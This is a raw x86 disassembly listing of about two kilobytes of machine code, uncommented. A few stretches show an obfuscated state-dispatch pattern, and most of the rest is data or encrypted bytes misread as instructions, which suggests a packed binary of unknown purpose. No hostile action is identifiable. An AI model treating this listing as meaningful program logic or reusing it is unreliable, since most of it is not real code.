  402898:	adc    BYTE PTR [ecx-0x69],ah
  40289b:	call   0x19b60c59
  4028a0:	cmc    
  4028a1:	(bad)  
  4028a2:	je     0x4028b6
  4028a8:	mov    eax,DWORD PTR [ebp-0x8]
  4028ab:	mov    DWORD PTR [eax],0x60341e8d
  4028b1:	jmp    0x402f69
  4028b6:	mov    eax,DWORD PTR [ebp+0x8]
  4028b9:	mov    ecx,DWORD PTR [ebp-0x8]
  4028bc:	xor    eax,esi
  4028be:	add    eax,edi
  4028c0:	cmp    DWORD PTR [ecx],eax
  4028c2:	je     0x402c4b
  4028c8:	mov    ecx,DWORD PTR [ebp-0x14]
  4028cb:	mov    eax,DWORD PTR [ebp-0x8]
  4028ce:	mov    eax,DWORD PTR [eax]
  4028d0:	jmp    0x402bd6
  4028d5:	in     eax,dx
  4028d6:	outs   dx,BYTE PTR ds:[esi]
  4028d7:	out    0xf4,eax
  4028d9:	jae    0x40294c
  4028db:	std    
  4028dc:	jne    0x402955
  4028de:	lds    esi,FWORD PTR [edi]
  4028e0:	int3   
  4028e1:	ror    BYTE PTR [eax+0x8dd460e],1
  4028e7:	jl     0x402965
  4028e9:	addr16 jle 0x402968
  4028ec:	jl     0x40287c
  4028ee:	sbb    eax,0xac2ba85d
  4028f3:	int3   
  4028f4:	jne    0x402938
  4028f6:	xchg   ecx,eax
  4028f7:	mov    edx,0x25cde9fe
  4028fc:	cld    
  4028fd:	sbb    eax,esi
  4028ff:	fmul   DWORD PTR [ebx]
  402901:	mov    ebx,edi
  402903:	aam    0x8d
  402905:	ja     0x402954
  402907:	sbb    bh,BYTE PTR [ebp+0x3e]
  40290a:	fwait
  40290b:	push   ss
  40290c:	lods   eax,DWORD PTR ds:[esi]
  40290d:	inc    esi
  40290e:	paddsw mm2,QWORD PTR ds:0x45860d78
  402915:	in     al,dx
  402916:	inc    edi
  402917:	mov    eax,ds:0x3dbf09a
  40291c:	sub    eax,DWORD PTR [edi]
  40291e:	(bad)  
  40291f:	mov    bl,0xd5
  402921:	aam    0x31
  402923:	xor    dl,0x69
  402926:	add    dl,BYTE PTR [eax]
  402928:	lahf   
  402929:	add    ah,dh
  40292b:	xchg   esi,eax
  40292c:	pop    es
  40292d:	inc    edx
  40292e:	sbb    esi,edi
  402930:	add    eax,0x2ff388b2
  402935:	inc    esp
  402936:	pusha  
  402937:	push   ds
  402938:	in     eax,0x29
  40293a:	ss push ecx
  40293c:	push   edi
  40293d:	add    dh,bh
  40293f:	and    edx,0xfffffff5
  402942:	scas   al,BYTE PTR es:[edi]
  402943:	xchg   edi,eax
  402944:	add    BYTE PTR [eax+ebp*8-0x421297e],ch
  40294b:	ror    BYTE PTR [eax],cl
  40294d:	xchg   edx,eax
  40294e:	dec    eax
  40294f:	sbb    bh,BYTE PTR [esi]
  402951:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402952:	mov    DWORD PTR [ebx],esp
  402954:	mov    edi,0x671b5425
  402959:	jae    0x402988
  40295b:	(bad)  
  40295c:	push   0xe8281c15
  402961:	mov    eax,ds:0xc96a97f9
  402966:	call   0x3bfd:0x43cc878a
  40296d:	sahf   
  40296e:	hlt    
  40296f:	rcr    BYTE PTR [eax+ebx*4],cl
  402972:	jns    0x4029af
  402974:	test   al,0xb9
  402976:	mov    ah,0xb8
  402978:	pushf  
  402979:	mov    ebp,0xef42bc2a
  40297e:	mov    dh,0xd2
  402980:	xchg   esi,eax
  402981:	xchg   edi,eax
  402982:	ror    ah,0x4a
  402985:	adc    DWORD PTR [ecx],0x22
  402988:	pop    edx
  402989:	or     BYTE PTR [eax],0xfa
  40298c:	cmp    al,0x46
  40298e:	and    ebx,ecx
  402990:	fisubr DWORD PTR ds:0xc6e0ab2b
  402996:	aaa    
  402997:	(bad)  [edx]
  402999:	mov    WORD PTR [edx+0x7f2dc11b],es
  40299f:	xlat   BYTE PTR ds:[ebx]
  4029a0:	sbb    DWORD PTR [esi+0x62],edx
  4029a3:	jns    0x402978
  4029a5:	mov    ch,0x18
  4029a7:	sar    BYTE PTR [eax+0x6352d27d],0x40
  4029ae:	adc    ebp,edi
  4029b0:	into   
  4029b1:	cdq    
  4029b2:	in     eax,0xd1
  4029b4:	or     al,0xf2
  4029b6:	int    0xb8
  4029b8:	xchg   edx,eax
  4029b9:	mov    ebp,0x30e02ee5
  4029be:	imul   ebp,DWORD PTR [eax-0x3d],0xd935fda5
  4029c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029c6:	mov    WORD PTR ds:0x9a915724,fs
  4029cc:	lds    edx,FWORD PTR [edx+0x576358ac]
  4029d2:	loopne 0x4029b5
  4029d4:	pop    ds
  4029d5:	fdiv   st(4),st
  4029d7:	call   0xf288:0x8e6e2bec
  4029de:	mov    dh,0x96
  4029e0:	cmp    DWORD PTR [ebx-0x64496c57],esi
  4029e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029e7:	cmp    DWORD PTR [esi+0x6ec18514],esi
  4029ed:	sub    cl,ch
  4029ef:	or     DWORD PTR [ebx-0x53a6607a],esi
  4029f5:	mov    BYTE PTR [ecx+edi*1],ah
  4029f8:	add    eax,0x6127a361
  4029fd:	xchg   DWORD PTR [esi],esi
  4029ff:	in     al,0x1f
  402a01:	add    edx,DWORD PTR [eax-0x1bee808b]
  402a07:	ja     0x402a83
  402a09:	sbb    DWORD PTR [edx+0x4a46c808],ebx
  402a0f:	idiv   ebp
  402a11:	sar    cl,cl
  402a13:	repnz data16 mov ch,0x81
  402a17:	dec    ebx
  402a18:	jmp    0xd9307cc5
  402a1d:	inc    esp
  402a1e:	add    DWORD PTR [ecx-0x2c],ebx
  402a21:	les    edx,FWORD PTR [eax+0x2c44b59f]
  402a27:	data16 shr BYTE PTR [edx-0x5],1
  402a2b:	fxtract 
  402a2d:	dec    edx
  402a2e:	sub    eax,0xcd4df74d
  402a33:	or     ecx,ebp
  402a35:	lahf   
  402a36:	int3   
  402a37:	mov    ebp,0x9a118f8f
  402a3c:	push   0xfffffff4
  402a3e:	fidivr DWORD PTR [ecx+0x49]
  402a41:	cmp    ah,BYTE PTR [ebp+0x916015d]
  402a47:	sahf   
  402a48:	add    cl,al
  402a4a:	loopne 0x402ab2
  402a4c:	pop    es
  402a4d:	sub    DWORD PTR [edi],esi
  402a4f:	xor    al,0xe
  402a51:	inc    eax
  402a52:	push   ds
  402a53:	or     BYTE PTR [ebp-0x7b8fd61d],bh
  402a59:	jno    0x4029df
  402a5b:	shl    BYTE PTR [edi],0x8c
  402a5e:	add    BYTE PTR [edx],cl
  402a60:	sar    ch,1
  402a62:	pop    edx
  402a63:	jmp    0xdfe9ed44
  402a68:	add    esp,DWORD PTR [eax-0x7072d9f]
  402a6e:	xor    ch,BYTE PTR [ecx]
  402a70:	xchg   esp,eax
  402a71:	or     eax,0x461f8e13
  402a76:	xchg   edx,eax
  402a77:	or     al,0x37
  402a79:	mov    cl,0xc3
  402a7b:	and    eax,0x1a0c3771
  402a80:	xchg   BYTE PTR [edx],bl
  402a82:	and    al,0x82
  402a84:	adc    DWORD PTR [ebp+0x5adbbdaa],ebp
  402a8a:	bsf    eax,DWORD PTR [ecx-0x5a842067]
  402a91:	sub    eax,0x108f7f62
  402a96:	xor    BYTE PTR [ebx+0x2a76b74b],ch
  402a9c:	into   
  402a9d:	sbb    ecx,DWORD PTR [edi-0x43e24f7b]
  402aa3:	mov    bh,0xe7
  402aa5:	cli    
  402aa6:	xchg   ebx,eax
  402aa7:	xchg   ebp,eax
  402aa8:	and    DWORD PTR [eax],eax
  402aaa:	cmp    esi,ebp
  402aac:	cs dec ecx
  402aae:	pusha  
  402aaf:	or     dl,BYTE PTR [esi-0x44ae05bd]
  402ab5:	jb     0x402a7c
  402ab7:	mov    eax,0xa7e171c
  402abc:	inc    ebx
  402abd:	ds stc 
  402abf:	cmp    al,BYTE PTR [edx]
  402ac1:	cmp    dl,BYTE PTR [edx+0x918bdcc]
  402ac7:	sub    ecx,DWORD PTR [ecx]
  402ac9:	stos   BYTE PTR es:[edi],al
  402aca:	and    al,BYTE PTR [esi+0x1f]
  402acd:	sti    
  402ace:	xchg   edx,eax
  402acf:	jl     0x402ad5
  402ad1:	mov    bl,0x82
  402ad3:	aaa    
  402ad4:	xor    DWORD PTR [ecx],esp
  402ad6:	xchg   edx,eax
  402ad7:	mov    ecx,0x3bb8bd85
  402adc:	repz mov eax,0x5daddf6e
  402ae2:	jecxz  0x402b07
  402ae4:	inc    edx
  402ae5:	int    0xe9
  402ae7:	jle    0x402aef
  402ae9:	mov    dh,0xaf
  402aeb:	stc    
  402aec:	or     BYTE PTR [edx+ebx*2],bh
  402aef:	or     edi,edi
  402af1:	dec    edi
  402af2:	sbb    edx,edi
  402af4:	cmp    al,0x61
  402af6:	inc    eax
  402af7:	sahf   
  402af8:	outs   dx,BYTE PTR ds:[esi]
  402af9:	popf   
  402afa:	sbb    eax,0xe623ba96
  402aff:	in     eax,0x20
  402b01:	pushf  
  402b02:	adc    al,0x5d
  402b04:	sub    eax,0x1a6730b6
  402b09:	inc    esi
  402b0a:	push   ecx
  402b0b:	sti    
  402b0c:	sar    BYTE PTR [esi-0x244283a7],1
  402b12:	cmp    bl,BYTE PTR [eax]
  402b14:	pop    esi
  402b15:	and    edi,DWORD PTR [edi+0x7bb0caa2]
  402b1b:	inc    ecx
  402b1c:	pop    edx
  402b1d:	jmp    0x580:0xcad1d9d9
  402b24:	pop    ebp
  402b25:	xor    BYTE PTR [eax+0x7d],dl
  402b28:	push   cs
  402b29:	jg     0x402b5f
  402b2b:	popa   
  402b2c:	xchg   ecx,eax
  402b2d:	pop    ds
  402b2e:	pop    ebp
  402b2f:	cmp    eax,DWORD PTR [edi-0x486092cc]
  402b35:	xchg   ecx,eax
  402b36:	jbe    0x402b61
  402b38:	jb     0x402ba7
  402b3a:	sahf   
  402b3b:	sahf   
  402b3c:	(bad)  [ebx-0x23]
  402b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b40:	ret    0x950e
  402b43:	dec    ecx
  402b44:	in     eax,dx
  402b45:	in     eax,dx
  402b46:	adc    al,0xea
  402b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b49:	sti    
  402b4a:	inc    ebx
  402b4b:	mov    BYTE PTR [eax],dh
  402b4d:	add    BYTE PTR [ebp-0x61de9a3e],bl
  402b53:	out    dx,eax
  402b54:	mov    esi,0x1301fe09
  402b59:	push   esp
  402b5a:	mov    ds:0xf86c8587,al
  402b5f:	or     eax,DWORD PTR [ecx]
  402b61:	sub    ebp,0x67b9e5d8
  402b67:	loope  0x402b2f
  402b69:	xchg   esi,eax
  402b6a:	adc    eax,0x7478da12
  402b6f:	aas    
  402b70:	shl    BYTE PTR [esi+0xafb4b54],1
  402b76:	pop    es
  402b77:	push   edx
  402b78:	xor    BYTE PTR [ebp-0x2f],ah
  402b7b:	mov    ss,WORD PTR [edx+0x25]
  402b7e:	int3   
  402b7f:	jp     0x402b95
  402b81:	fs scas al,BYTE PTR es:[edi]
  402b83:	imul   ecx
  402b85:	xchg   ecx,eax
  402b86:	mov    dh,0xe1
  402b88:	xchg   DWORD PTR [bx-0xf7e],esi
  402b8d:	test   eax,0x1830f7a6
  402b92:	sub    al,0x14
  402b94:	out    dx,eax
  402b95:	add    ah,BYTE PTR [ebx]
  402b97:	shr    cl,1
  402b99:	retf   0x8bb4
  402b9c:	les    ebx,FWORD PTR [eax+0x49]
  402b9f:	repz or ah,dh
  402ba2:	outs   dx,BYTE PTR cs:[esi]
  402ba4:	sub    BYTE PTR [esi-0x99821bc],ch
  402baa:	adc    esp,DWORD PTR [esi-0x7b40a3f3]
  402bb0:	inc    edi
  402bb1:	adc    dh,cl
  402bb3:	mov    eax,ds:0x64533600
  402bb8:	fcmovb st,st(3)
  402bba:	sbb    eax,0x1aa99621
  402bbf:	push   0xffffffc8
  402bc1:	sahf   
  402bc2:	and    al,0x74
  402bc4:	push   ebp
  402bc5:	mov    esi,0xbc43f149
  402bca:	add    BYTE PTR [edi-0x52],0x27
  402bce:	int3   
  402bcf:	xor    DWORD PTR [ebp-0x6b],edi
  402bd2:	cld    
  402bd3:	cmp    DWORD PTR [ebp+0x3c408b5f],edx
  402bd9:	lea    ecx,[ecx*8+0x78]
  402be0:	add    eax,ecx
  402be2:	mov    ecx,DWORD PTR [ebp-0x8]
  402be5:	mov    ecx,DWORD PTR [ecx]
  402be7:	mov    eax,DWORD PTR [eax+ecx*1]
  402bea:	mov    DWORD PTR [ebp-0x1c],eax
  402bed:	mov    eax,DWORD PTR [ebp+0x8]
  402bf0:	xor    eax,esi
  402bf2:	add    eax,edi
  402bf4:	mov    DWORD PTR [ebp-0x20],eax
  402bf7:	mov    eax,DWORD PTR [ebp+0x8]
  402bfa:	mov    ecx,DWORD PTR [ebp-0x1c]
  402bfd:	xor    eax,esi
  402bff:	add    eax,edi
  402c01:	cmp    ecx,eax
  402c03:	je     0x402f69
  402c09:	mov    eax,DWORD PTR [ebp-0x8]
  402c0c:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c0f:	add    ecx,DWORD PTR [eax]
  402c11:	mov    DWORD PTR [ebp-0x20],ecx
  402c14:	mov    eax,DWORD PTR [ebp-0x20]
  402c17:	mov    ecx,DWORD PTR [ebp-0x8]
  402c1a:	mov    eax,DWORD PTR [eax+0xc]
  402c1d:	mov    ecx,DWORD PTR [ecx]
  402c1f:	mov    al,BYTE PTR [eax+ecx*1]
  402c22:	add    al,0x39
  402c24:	xor    al,0x45
  402c26:	cmp    al,0xc1
  402c28:	je     0x402c3f
  402c2e:	mov    eax,DWORD PTR [ebp+0x8]
  402c31:	mov    ecx,DWORD PTR [ebp-0x8]
  402c34:	xor    eax,esi
  402c36:	add    eax,edi
  402c38:	mov    DWORD PTR [ecx],eax
  402c3a:	jmp    0x402f69
  402c3f:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  402c46:	jmp    0x402f69
  402c4b:	mov    eax,DWORD PTR [ebp-0x8]
  402c4e:	mov    ecx,DWORD PTR [ebp-0x18]
  402c51:	mov    ecx,DWORD PTR [ecx]
  402c53:	mov    DWORD PTR [eax],ecx
  402c55:	mov    eax,DWORD PTR [ebp+0xc]
  402c58:	mov    eax,DWORD PTR [ebp+0x8]
  402c5b:	jmp    0x402f61
  402c60:	add    al,0x8f
  402c62:	and    ecx,0xffffff93
  402c65:	std    
  402c66:	bound  ebp,QWORD PTR [ecx-0x45]
  402c69:	or     DWORD PTR [edi+0x5d],eax
  402c6c:	xchg   ebp,eax
  402c6d:	xor    dh,dh
  402c6f:	and    eax,0x7c7c15c4
  402c74:	addr16 jle 0x402cf3
  402c77:	jl     0x402bfd
  402c79:	sub    al,0x4a
  402c7b:	mov    es,WORD PTR [esi+edi*8]
  402c7e:	in     al,dx
  402c7f:	or     eax,0xcea6be6e
  402c84:	retf   
  402c85:	add    ah,ah
  402c87:	mov    ebx,0x91bd71d3
  402c8c:	call   0xe7e5551e
  402c91:	add    ecx,DWORD PTR [eax]
  402c93:	xor    eax,0x5ef81343
  402c98:	xor    BYTE PTR [eax],ah
  402c9a:	cmp    al,0x59
  402c9c:	jmp    0xe6ed:0x15fce392
  402ca3:	mov    bh,0x9d
  402ca5:	mov    ebx,0xf16046b9
  402caa:	adc    eax,0x85a877a7
  402caf:	bound  esi,QWORD PTR [ecx+0x397f3b3c]
  402cb5:	(bad)  
  402cb6:	dec    ebp
  402cb7:	hlt    
  402cb8:	xor    al,0xfe
  402cba:	adc    BYTE PTR ds:0xaff72d1a,ah
  402cc0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  402cc2:	adc    DWORD PTR [eax-0x362d483f],esp
  402cc8:	add    al,BYTE PTR [esi+esi*8-0x4a0c8c2c]
  402ccf:	dec    edx
  402cd0:	sub    bl,BYTE PTR [edx-0x1df65f7a]
  402cd6:	and    dl,BYTE PTR [esi+0x6d64f4be]
  402cdc:	dec    ebx
  402cdd:	int    0x16
  402cdf:	xor    dl,BYTE PTR [ecx+0x33]
  402ce2:	jge    0x402ce4
  402ce4:	dec    ecx
  402ce5:	jmp    0xb5e:0xe4e4b4cd
  402cec:	mov    edx,0x54bed0fd
  402cf1:	jp     0x402d2a
  402cf3:	test   eax,0xe3b8f495
  402cf8:	test   DWORD PTR [esi],ebp
  402cfa:	(bad)  
  402cfb:	jne    0x402d49
  402cfd:	pusha  
  402cfe:	push   es
  402cff:	sbb    esi,DWORD PTR [edx-0x52d6d837]
  402d05:	out    dx,eax
  402d06:	and    eax,0x462c278d
  402d0b:	(bad)  
  402d0c:	ds jb  0x402d36
  402d0f:	and    ebp,DWORD PTR [ecx+0x44]
  402d12:	or     BYTE PTR [edx],al
  402d14:	test   eax,0x65fd9c15
  402d19:	pop    ecx
  402d1a:	mov    edx,DWORD PTR [edi+0x33]
  402d1d:	data16 add BYTE PTR [edi-0x24],al
  402d21:	jge    0x402d2d
  402d23:	and    eax,0x76e15532
  402d28:	out    0xb8,al
  402d2a:	mov    eax,0xc49ace69
  402d2f:	pop    edx
  402d30:	in     eax,0x89
  402d32:	push   ecx
  402d33:	pop    edi
  402d34:	sbb    BYTE PTR [ecx+0x59],al
  402d37:	push   0xffffffcc
  402d39:	pop    eax
  402d3a:	out    0x23,al
  402d3c:	mov    eax,DWORD PTR [edx+eax*4-0x18]
  402d40:	push   ebp
  402d41:	dec    ebx
  402d42:	inc    esp
  402d43:	cmc    
  402d44:	or     BYTE PTR [edx],0x37
  402d47:	push   edx
  402d48:	lods   al,BYTE PTR ds:[esi]
  402d49:	loope  0x402d07
  402d4b:	icebp  
  402d4c:	fdivr  QWORD PTR [esi+0x6285d8d8]
  402d52:	mov    dh,0x0
  402d54:	xchg   esi,eax
  402d55:	mov    eax,0x5c3091fb
  402d5a:	pushf  
  402d5b:	jecxz  0x402d99
  402d5d:	in     eax,0x45
  402d5f:	push   0x4
  402d61:	lahf   
  402d62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d63:	cmp    esp,edx
  402d65:	and    eax,0x8b5d2e20
  402d6a:	or     al,0x39
  402d6c:	and    BYTE PTR [ebp-0x6621cefb],0xfe
  402d73:	lahf   
  402d74:	out    dx,al
  402d75:	xor    edx,DWORD PTR [edi+esi*8]
  402d78:	mov    dl,0x80
  402d7a:	adc    BYTE PTR [edi+0x3b],al
  402d7d:	cmc    
  402d7e:	adc    al,0x6b
  402d80:	xchg   ebp,eax
  402d81:	adc    ah,BYTE PTR ds:0xa7693951
  402d87:	xchg   esi,eax
  402d88:	retf   0xecca
  402d8b:	sbb    BYTE PTR [eax],cl
  402d8d:	in     al,dx
  402d8e:	and    BYTE PTR [ebx-0x4e],al
  402d91:	fidiv  WORD PTR [esi+0x68]
  402d94:	mov    eax,0xacc64329
  402d99:	pop    edi
  402d9a:	and    BYTE PTR [edx-0x48],dh
  402d9d:	out    dx,eax
  402d9e:	xchg   edi,eax
  402d9f:	jg     0x402d59
  402da1:	sub    esi,esi
  402da3:	fldcw  WORD PTR [edi]
  402da5:	sbb    BYTE PTR [edi+0x1a2bc529],dh
  402dab:	add    eax,0xf5bef2b0
  402db0:	mov    edi,0xae8da1a8
  402db5:	dec    ebp
  402db6:	jecxz  0x402d57
  402db8:	or     ch,BYTE PTR [ebp-0x103ce88b]
  402dbe:	mov    ecx,DWORD PTR [edi+edi*8-0x5e]
  402dc2:	jmp    0xbf4df48d
  402dc7:	addr16 fld st(3)
  402dca:	int3   
  402dcb:	inc    ecx
  402dcc:	dec    esi
  402dcd:	xchg   edi,eax
  402dce:	test   eax,0xb33446cc
  402dd3:	fs stos DWORD PTR es:[edi],eax
  402dd5:	and    edx,DWORD PTR [esi+ebp*1+0x4f]
  402dd9:	daa    
  402dda:	(bad)  
  402ddb:	jae    0x402e1f
  402ddd:	les    eax,FWORD PTR [edx-0x33]
  402de0:	daa    
  402de1:	int    0xdf
  402de3:	cmc    
  402de4:	(bad)  
  402de5:	cmc    
  402de6:	and    BYTE PTR [esi-0x46969b89],bh
  402dec:	fistp  DWORD PTR [eax+0xe]
  402def:	xchg   DWORD PTR [eax],edi
  402df1:	lods   al,BYTE PTR ds:[esi]
  402df2:	stos   BYTE PTR es:[edi],al
  402df3:	cmp    cl,BYTE PTR ds:0x6be66b2a
  402df9:	jb     0x402deb
  402dfb:	shl    eax,0x4b
  402dfe:	iret   
  402dff:	push   0x2e
  402e01:	xchg   esp,eax
  402e02:	leave  
  402e03:	adc    ch,BYTE PTR [eax+edx*2+0x30907e66]
  402e0a:	mov    edx,cs
  402e0c:	(bad)
  402e0f:	jle    0x402e6f
  402e11:	lahf   
  402e12:	popf   
  402e13:	pop    ds
  402e14:	fisttp QWORD PTR cs:[esi]
  402e17:	fbstp  TBYTE PTR [ecx+0x71]
  402e1a:	retf   
  402e1b:	adc    BYTE PTR [eax],0x90
  402e1e:	pushaw 
  402e20:	stc    
  402e21:	or     DWORD PTR [esi-0x3b217088],0xc8d67283
  402e2b:	aas    
  402e2c:	sbb    BYTE PTR [eax-0xefa9cac],dl
  402e32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e33:	xchg   BYTE PTR [edi+0x6c],bh
  402e36:	jmp    0x402e2f
  402e38:	in     al,dx
  402e39:	mov    ds:0x75121565,al
  402e3e:	push   edx
  402e3f:	in     eax,dx
  402e40:	clc    
  402e41:	xchg   esp,eax
  402e42:	cmp    dl,BYTE PTR [esp+ebx*2]
  402e45:	fild   DWORD PTR es:[edx-0x4ecc5e73]
  402e4c:	mov    eax,ds:0xb4031e6c
  402e51:	sti    
  402e52:	icebp  
  402e53:	addr16 pop edi
  402e55:	lods   al,BYTE PTR ds:[esi]
  402e56:	xchg   DWORD PTR [esi+0x3efb16b9],esi
  402e5c:	test   al,0xd0
  402e5e:	push   0xffffff8b
  402e60:	push   edx
  402e61:	pop    edx
  402e62:	dec    ebx
  402e63:	call   0x23a7:0xebc754a6
  402e6a:	popa   
  402e6b:	test   al,0x9e
  402e6d:	pop    esp
  402e6e:	aaa    
  402e6f:	push   0xffffff91
  402e71:	pop    edx
  402e72:	imul   esi,DWORD PTR [ecx-0x59],0xfffffff5
  402e76:	lods   eax,DWORD PTR ds:[esi]
  402e77:	xchg   ebp,eax
  402e78:	repz pop es
  402e7a:	jl     0x402e78
  402e7c:	dec    ecx
  402e7d:	int3   
  402e7e:	sti    
  402e7f:	sbb    al,0xb9
  402e81:	dec    ebp
  402e82:	xor    dl,bh
  402e84:	mov    ecx,0x2983b494
  402e89:	sbb    dh,bh
  402e8b:	sbb    bl,BYTE PTR [esi+0x53]
  402e8e:	xor    bl,BYTE PTR [edx]
  402e90:	adc    ebp,DWORD PTR [ebx]
  402e92:	popa   
  402e93:	jmp    0x402ec1
  402e95:	push   0x62
  402e97:	add    al,BYTE PTR [esi]
  402e99:	add    eax,0xcc5a1f84
  402e9e:	xor    al,0x56
  402ea0:	repnz ins DWORD PTR es:[edi],dx
  402ea2:	fmul   st(6),st
  402ea4:	adc    al,BYTE PTR [esp+ebx*4-0x4d232564]
  402eab:	sbb    esp,DWORD PTR [edx+0x5b4a3050]
  402eb1:	mov    edi,0xc515c88
  402eb6:	ds xchg edi,eax
  402eb8:	push   edi
  402eb9:	fsubrp st(0),st
  402ebb:	popa   
  402ebc:	test   DWORD PTR [edx],0x21d360ce
  402ec2:	outs   dx,DWORD PTR ds:[esi]
  402ec3:	xchg   esi,eax
  402ec4:	(bad)  
  402ec5:	push   edx
  402ec6:	or     cl,BYTE PTR [ebx]
  402ec8:	jge    0x402f0c
  402eca:	js     0x402f49
  402ecc:	rol    BYTE PTR [ebp-0x16],1
  402ecf:	mov    ebp,DWORD PTR [ebx-0x746b4c91]
  402ed5:	sub    ecx,0x89780b63
  402edb:	lea    esi,[ebp+0x6707f65b]
  402ee1:	push   es
  402ee2:	sbb    al,0x64
  402ee4:	jmp    0x20342900
  402ee9:	fwait
  402eea:	outs   dx,DWORD PTR ds:[esi]
  402eeb:	mov    al,ds:0x6cf2e541
  402ef0:	push   0xfffffffb
  402ef2:	pop    ds
  402ef3:	cmc    
  402ef4:	enter  0x57da,0x44
  402ef8:	int3   
  402ef9:	cs add al,0xb1
  402efc:	mov    edi,DWORD PTR [eax+esi*4-0x75e6b005]
  402f03:	hlt    
  402f04:	por    mm4,mm4
  402f07:	enter  0x18e1,0xac
  402f0b:	hlt    
  402f0c:	push   es
  402f0d:	sbb    eax,0x4bea7205
  402f12:	stos   BYTE PTR es:[edi],al
  402f13:	or     cl,bh
  402f15:	lds    edi,FWORD PTR [edx-0x547128b0]
  402f1b:	dec    ebx
  402f1c:	cmp    al,0x16
  402f1e:	cmp    esp,DWORD PTR [ebp-0x4a]
  402f21:	jmp    0x402edf
  402f23:	adc    eax,0xf316ec59
  402f28:	and    esi,0x8
  402f2b:	push   ss
  402f2c:	jae    0x402f43
  402f2e:	mov    esp,0x77a38405
  402f33:	fdivr  QWORD PTR [eax+0x48097a82]
  402f39:	ficom  WORD PTR [esi-0x6f]
  402f3c:	lock cwde 
  402f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3f:	data16 jae 0x402fb7
  402f42:	xlat   BYTE PTR ds:[ebx]
  402f43:	ds std 
  402f45:	pop    ebx
  402f46:	add    BYTE PTR [edi-0x73],bh
  402f49:	push   cs
  402f4a:	cdq    
  402f4b:	scas   eax,DWORD PTR es:[edi]
  402f4c:	mov    al,ds:0x9e478ef2
  402f51:	xor    bh,BYTE PTR [edi+edx*4+0x54949b97]
  402f58:	cmp    esp,ebx
  402f5a:	sahf   
  402f5b:	subps  xmm7,xmm0
  402f5e:	rol    BYTE PTR [bp+di+0x75ff],0xf8
  402f64:	call   0x4062cd
  402f69:	mov    eax,DWORD PTR [ebp-0xc]
  402f6c:	cmp    eax,ebx
  402f6e:	je     0x401817
  402f74:	mov    eax,DWORD PTR [ebp-0x8]
  402f77:	mov    eax,DWORD PTR [eax]
  402f79:	pop    edi
  402f7a:	pop    esi
  402f7b:	jmp    0x403281
  402f80:	imul   ebx,DWORD PTR [eax],0x54
  402f83:	cmc    
  402f84:	push   edi
  402f85:	jge    0x403004
  402f87:	call   0x3a3a:0x1360eb95
  402f8e:	mov    esp,0x7c162f99
  402f93:	jl     0x402ffc
  402f95:	jle    0x403013
  402f97:	jl     0x402fc7
  402f99:	jecxz  0x402f61
  402f9b:	fs and edi,esp
  402f9e:	int3   
  402f9f:	sbb    BYTE PTR [ecx],0x58
  402fa2:	dec    esp
  402fa3:	imul   BYTE PTR [edi-0x58]
  402fa6:	sbb    eax,0xede9f32f
  402fab:	xchg   edx,eax
  402fac:	test   eax,0xbd76aea2
  402fb1:	das    
  402fb2:	ins    BYTE PTR es:[edi],dx
  402fb3:	jns    0x402f89
  402fb5:	cmp    eax,0x77088fe0
  402fba:	imul   edx,DWORD PTR ds:0x98baacc1,0x6e
  402fc1:	out    0xad,eax
  402fc3:	push   esp
  402fc4:	fcomp  QWORD PTR [edx+0x2d]
  402fc7:	cmp    BYTE PTR [edi+0x30],bl
  402fca:	push   eax
  402fcb:	inc    esi
  402fcc:	aad    0x49
  402fce:	ds xchg ebx,eax
  402fd0:	hlt    
  402fd1:	xchg   esp,eax
  402fd2:	push   cs
  402fd3:	add    BYTE PTR [esi-0x7ed91599],dl
  402fd9:	in     al,dx
  402fda:	xchg   esp,eax
  402fdb:	xlat   BYTE PTR ds:[ebx]
  402fdc:	loopne 0x403028
  402fde:	push   es
  402fdf:	dec    ecx
  402fe0:	arpl   WORD PTR [ebx],ax
  402fe2:	fiadd  WORD PTR [bp+di-0x2d]
  402fe6:	pop    ds
  402fe7:	jmp    0x539a3376
  402fec:	ret    0xfbfc
  402fef:	sbb    al,0xaf
  402ff1:	jle    0x403065
  402ff3:	jmp    0x402fc1
  402ff5:	pop    edi
  402ff6:	cmp    ebp,ebp
  402ff8:	sbb    ecx,esi
  402ffa:	pop    ebx
  402ffb:	dec    ecx
  402ffc:	push   0xd414ba97
  403001:	dec    edx
  403002:	xor    eax,0xc3f7253c
  403007:	mov    ecx,0x5c35b9ae
  40300c:	mov    ah,0xf0
  40300e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40300f:	call   0x5baea2c
  403014:	adc    eax,0xea0a1a10
  403019:	push   0xd
  40301b:	or     eax,DWORD PTR [ebp+0x7589fea3]
  403021:	jns    0x402fb0
  403023:	add    ebx,DWORD PTR [esp+ecx*8-0x3a]
  403027:	pop    ss
  403028:	ret    0x293b
  40302b:	cmp    edi,DWORD PTR [eax-0x39]
  40302e:	outs   dx,BYTE PTR ds:[esi]
  40302f:	push   ecx
  403030:	inc    ebx
  403031:	cmp    ecx,esp
  403033:	aam    0x3b
  403035:	push   ecx
  403036:	imul   esp,DWORD PTR [ebx+ebp*4+0x39],0x9c0f34a3
  40303e:	or     eax,DWORD PTR [ebx]
  403040:	xor    esp,edi
  403042:	call   0xe33c:0x482fddb5
  403049:	test   BYTE PTR [edx-0x6b5cf605],ah
  40304f:	imul   ebp,edi,0x70526547
  403055:	jle    0x40300b
  403057:	xchg   ebp,eax
  403058:	int    0xa9
  40305a:	loope  0x403084
  40305c:	sub    DWORD PTR [ecx+0x63],edi
  40305f:	lock cdq 
  403061:	and    BYTE PTR [eax+0x1b],0x46
  403065:	je     0x40307f
  403067:	xor    eax,0x90792c4c
  40306c:	jmp    0xfd0333d6
  403071:	pop    esi
  403072:	lock (bad) 
  403074:	mov    ?,ecx
  403076:	push   ecx
  403077:	push   ds
  403078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403079:	adc    eax,0x6a307a2f
  40307e:	add    DWORD PTR ss:[ebx+eiz*4],edx
